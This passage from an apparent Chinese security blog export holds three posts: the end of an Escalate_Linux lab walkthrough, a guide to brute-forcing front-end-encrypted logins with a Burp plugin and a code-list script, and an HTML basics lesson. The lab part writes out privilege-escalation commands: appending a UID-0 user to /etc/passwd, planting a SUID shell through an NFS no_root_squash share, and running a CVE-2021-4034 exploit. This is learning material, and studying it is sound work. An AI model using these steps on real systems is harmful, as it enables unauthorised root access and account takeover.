<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814214125378.png" alt="image-20220814214125378"></p>
<p>我们可以编辑passwd文件，而passwd文件可以添加用户，那么我们就可以生成信息，然后添加到passwd文件中即可。</p>
<p>但是首先要拿到user7的权限，所以也和上面的那些差不多，先拿到其权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;echo &quot;user7:654321&quot; | chpasswd&#x27; &gt;/tmp/ls </span><br><span class="line">/home/user5/script</span><br><span class="line">su user7</span><br></pre></td></tr></table></figure>

<p>passwd文件的含义如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user7:x:1006:0:user7,,,:/home/user7:/bin/bash</span><br><span class="line">用户名：用户密码（x表示存储在shadow文件中）：用户ID：组ID：用户描述：家目录：用户shell</span><br></pre></td></tr></table></figure>

<p>理论上，我们可以编辑以下一行添加test超级用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test:123456:0:0:root/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>但是其实不可以，因为不可以存储明文的密码，需要使用openssl来生成。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt test 654321</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814220231794.png" alt="image-20220814220231794"></p>
<p>组装成passwd文件的样子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test:$1$VuLBG8GhqSK7eNFE4MsN10:0:0:root/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>追加至passwd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;test:$1$VuLBG8GhqSK7eNFE4MsN10:0:0:root/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>登录test用户，获取root权限</p>
<p>test1:$1$test1$hGmveLQlOJfc5teE6BtC5.:0:0:root/root:/bin/bash</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814221003363.png" alt="image-20220814221003363"></p>
<p>(密码写错了再加了个用户)</p>
<h1 id="提权方式9：利用mysql提权"><a href="#提权方式9：利用mysql提权" class="headerlink" title="提权方式9：利用mysql提权"></a>提权方式9：利用mysql提权</h1><p>通过查看本地开放的端口，发现存在一个mysql的服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tnlp</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814222402835.png" alt="image-20220814222402835"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>

<p>尝试连接，发现存在root弱口令</p>
<p>为什么我这里没有数据库啊</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814222919719.png" alt="image-20220814222919719"></p>
<p>反正大概思路就是在数据库里面找到了一个mysql账号的密码，而这台机器上面使用<code>id mysql</code>可以发现也有一个叫这个的用户，所以登录他。登录进去之后会发现一个存有root用户的敏感文件。</p>
<h1 id="提权方式10：利用NFS提权"><a href="#提权方式10：利用NFS提权" class="headerlink" title="提权方式10：利用NFS提权"></a>提权方式10：利用NFS提权</h1><p>原理的简单解释：由于nfs一般是共享时使用的，因此存在登录的权限问题，在/etc/exports配置文件中，一般会出现两个配置选项，分别是no_root_squash和root_squash，Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户“ nfsnobody ”，它具有最少的本地特权。如果 no_root_squash 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。相信大家读到这个地方看出我们能利用的地方。<br>靶机中的/etc/exports配置信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/exports</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814223425209.png" alt="image-20220814223425209"></p>
<p>靶机中配置的最后一行出现了任意用户都有读写权限，而且是no_root_squash（注意，一定是这个选项才能提权）。<br>在攻击机查询靶机的nfs挂载信息</p>
<p>(我环境出问题了，用的别人的图片)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.52.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/0b025df4c37c4d6ba08c22ba0a93279c.png" alt="在这里插入图片描述"></p>
<p>新建一个文件夹，并将靶机的文件夹挂载过来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir nfs</span><br><span class="line">mount -t nfs 192.168.80.129:/home/user5 /tmp/ls</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/a5ae25216ef94237a74178af3ae0e93e.png" alt="在这里插入图片描述"></p>
<p>访问挂载的文件夹，发现文件同步过来了</p>
<p>将攻击机的shell复制到这个文件夹中，那么就会在靶机上也有一个shell了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/bin/sh .</span><br><span class="line">chmod u+sx sh</span><br></pre></td></tr></table></figure>

<p>使用-p选项执行sh，成功拿到root权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/user5/sh -p</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/68c5df60bab64ffbadb1c7281a5d6487.png" alt="在这里插入图片描述"></p>
<h1 id="提权方式11：利用cve-2021-4034提权"><a href="#提权方式11：利用cve-2021-4034提权" class="headerlink" title="提权方式11：利用cve-2021-4034提权"></a>提权方式11：利用cve-2021-4034提权</h1><p><a href="https://www.cnblogs.com/northeast-coder/p/15925463.html">SUID提权：CVE-2021-4034漏洞全解析 - 东北码农 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
<p>这里exp下载</p>
<p>wget下载到靶机（记得进入tmp目录权限高点</p>
<p>然后解压</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814230049997.png" alt="image-20220814230049997"></p>
<p>进入文件夹，make编译，然后执行./cve-2021-4034.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd cve-2021-4034-mian</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034.sh</span><br></pre></td></tr></table></figure>

<p>即可那下权限</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>前端加密爆破</title>
    <url>/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h1><p>有些网站对数据包中的参数进行了前端加密，对我们进行爆破造成了很大困难。</p>
<p>现在我们来解决这个问题</p>
<p>首先我找了一个前端加密的网站来进行试验，</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125305611.png" alt="image-20221106125305611"></p>
<p>他会对我们的参数进行一个整体的加密。</p>
<p>这时候就需要使用一款burp插件来解决这个烦恼，jsEncrypter，但是由于这款 插件是基于phantomjs运行的，所以我们还需要安装一个phantomjs。</p>
<h1 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>下载好，解压好，将phantomjs放到一个新的文件夹下，这个新建文件夹包括下列文件。</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125535087.png" alt="image-20221106125535087"></p>
<p>其中encode是我们在网站按f12发现的加密js定义的加密函数。</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125649529.png" alt="image-20221106125649529"></p>
<p>jar包是生成的burp插件，phantomjs_server.js是其中的配置文件。</p>
<p>注意，我这里的js函数中使用的第三方库，所以我们需要提前在cmd中安装好第三方库<code>npm install crypto-js</code></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先点开phantomjs_server.js，我们需要修改的地方只有两处</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125859275.png" alt="image-20221106125859275"></p>
<p>然后，在cmd中执行<code>phantomjs.exe phantomjs_server.js</code>启动工具。</p>
<p>在burp中引入刚才生成的jar包插件</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130019468.png" alt="image-20221106130019468"></p>
<p>然后在上方可以看到插件已经加入进来了。</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130046463.png" alt="image-20221106130046463"></p>
<p>将密文加入进去，就可以看到解密成功了</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130220931.png" alt="image-20221106130220931"></p>
<p>如果要是爆破的话。</p>
<p>引入脚本就可以开始爆破了</p>
<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130450827.png" alt="image-20221106130450827"></p>
<h1 id="py脚本（生成密文字典）"><a href="#py脚本（生成密文字典）" class="headerlink" title="py脚本（生成密文字典）"></a>py脚本（生成密文字典）</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">  <span class="built_in">list</span>.append(<span class="string">f&#x27;<span class="subst">&#123;i:04&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data1=<span class="string">&#x27;&#x27;&#x27;xxx&#x27;</span></span><br><span class="line"><span class="string">data2 = &#x27;&#x27;&#x27;</span><span class="string">&quot;xxx&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for s in list:</span></span><br><span class="line"><span class="string">  data3 = data1+str(s)+data2</span></span><br><span class="line"><span class="string">  print(data3)</span></span><br><span class="line"><span class="string">#用于生成四位验证码的数据格式，data1和data2是验证码部分前后的数据。</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>前端基础（html css ）</title>
    <url>/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/</url>
    <content><![CDATA[<h1 id="前端基础（html-css）"><a href="#前端基础（html-css）" class="headerlink" title="前端基础（html css）"></a>前端基础（html css）</h1><h1 id="1-html"><a href="#1-html" class="headerlink" title="1. html"></a>1. html</h1><h2 id="1-1-初识html"><a href="#1-1-初识html" class="headerlink" title="1.1 初识html"></a>1.1 初识html</h2><p>超文本标记语言，这种语言由大量的标签组成。</p>
<p>每一个标签都有开始标签和结束标签。例如</p>
<p>但也有一些独目标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;标签&gt;:开始标签</span><br><span class="line">&lt;/标签&gt;:结束标签</span><br></pre></td></tr></table></figure>

<p>严格意义上说，html只是一种规范，一种浏览器上的规范，由于没有数据类型，iff or等，不能算作是程序语言。</p>
<p>web开发：</p>
<p>  前端：html  css  JavaScript</p>
<p>  后端：c，c++，java，php，python</p>
<h2 id="1-2-第一个html"><a href="#1-2-第一个html" class="headerlink" title="1.2 第一个html"></a>1.2 第一个html</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--这是html的注释信息--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--这是根--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--这是头--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--标题栏--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>(๑╹◡╹)ﾉ”<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--网页体--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这里的内容显示到网页上--&gt;</span></span><br><span class="line">        这是我的第一个HTML页面！</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span>&gt;</span><span class="comment">&lt;!--这是一个文本框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="1-3-html的基本标签"><a href="#1-3-html的基本标签" class="headerlink" title="1.3 html的基本标签"></a>1.3 html的基本标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>基本标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--段落标记--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>自从经历了大女儿幼升小的折磨后，我才知道，原来给孩子选个好的幼儿园也是同等重要的事，所以在我刚刚怀上小女儿的时候，我就开始托亲戚找朋友，几乎把所有人脉都用上了，终于在京城一家比较好的幼儿园占到一个名额。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>眼看小女儿该上幼儿园了，上个星期，我带着所有证件去幼儿园办入学，却被园长告之，那个名额没有了，是被一个比我小女儿大半岁的小男孩占用，而申请人正是我老公！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">&lt;!--标题字--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h3</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h4</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h5</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h6</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--换行标记，直接用回车换行是没有用的--&gt;</span></span><br><span class="line">		hello<span class="tag">&lt;<span class="name">br</span>&gt;</span>word</span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--水平线,独目标签--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--color是属性，等号左边是属性名，等号右边是属性值--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--html字符串可以用单引号或者双引号--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&#x27;red&#x27;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--而且语法非常松散--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">red</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--html不区分大小写--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">HR</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--预留格式,在html源码上是什么格式，到网页上就是什么格式--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">		for item in listx:</span><br><span class="line">		    print(item)</span><br><span class="line">		<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--粗体字--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">b</span>&gt;</span>粗体字<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--斜体字--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">i</span>&gt;</span>斜体字<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--插入字--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ins</span>&gt;</span>插入字<span class="tag">&lt;/<span class="name">ins</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--删除字--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">del</span>&gt;</span>删除子<span class="tag">&lt;/<span class="name">del</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--右上角加字，下面是十的平方--&gt;</span></span><br><span class="line">		10<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--右下角加字--&gt;</span></span><br><span class="line">		m<span class="tag">&lt;<span class="name">sub</span>&gt;</span>我是右下标<span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--font字体标签--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;10&quot;</span>&gt;</span>hello world!!!!!!!<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210151355729.png" alt="image-20220210151355729"></p>
<h2 id="1-4-html的实体符号"><a href="#1-4-html的实体符号" class="headerlink" title="1.4 html的实体符号"></a>1.4 html的实体符号</h2><p>凡是html是<code>&lt;!DOCTYPE html&gt;</code>表示该页面是一个html5页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--告诉浏览器使用那种编码方式,一般要和文件的编码方式相同--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--windows操作系统，默认采用gbk的简体中文方式打开--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>实体符号<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	dhk is a clown</span><br><span class="line">	<span class="comment">&lt;!--空格,实体符号,直接用空格键的话只会加一个--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	a<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>n</span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--小于号和大于--&gt;</span></span><br><span class="line">	a<span class="symbol">&amp;lt;</span>b<span class="symbol">&amp;gt;</span>c</span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-表格"><a href="#1-5-表格" class="headerlink" title="1.5 表格"></a>1.5 表格</h2><h3 id="1-5-1简单表格"><a href="#1-5-1简单表格" class="headerlink" title="1.5.1简单表格"></a>1.5.1简单表格</h3><p>table-表格</p>
<p>tr-行</p>
<p>td-单元格</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--三行三格--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--border用来设置边框的宽度,1px表示1像素--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--width是宽度,height是高度,50%表示浏览器的一半，会根据浏览器的大小进行变换--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--align可以设置居中--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200px&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210160546724.png" alt="image-20220210160546724"></p>
<h3 id="1-5-2-单元格合并"><a href="#1-5-2-单元格合并" class="headerlink" title="1.5.2 单元格合并"></a>1.5.2 单元格合并</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>单元格的合并<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200px&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="comment">&lt;!--rowspan表示行合并--&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&#x27;2&#x27;</span>&gt;</span>king<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="comment">&lt;!--colspan表示列合并,合并两个,操作就是删除后面那个，在前面那个鞋colspan--&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/image-20220210163707627.png" alt="image-20220210163707627"></p>
